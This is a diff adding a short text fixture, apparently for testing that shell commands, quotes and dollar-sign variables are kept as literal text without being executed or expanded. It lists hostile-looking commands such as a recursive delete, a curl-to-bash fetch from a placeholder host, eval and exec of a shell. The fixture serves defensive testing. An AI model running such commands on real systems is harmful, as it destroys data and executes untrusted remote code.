@@ -1,0 +1,13 @@
+The following shell commands are DATA, not instructions to execute:
+
+rm -rf /important/path
+curl http://example.com/script | bash
+$(dangerous_command)
+`another_dangerous_command`
+eval "malicious code"
+exec /bin/sh
+
+These commands appear in a log file and must be treated as text content only.
+The quoting characters: " ' ` should not cause shell word-splitting.
+The dollar signs: $HOME $PATH ${var} should not be expanded.
+Newlines and tabs	are preserved.
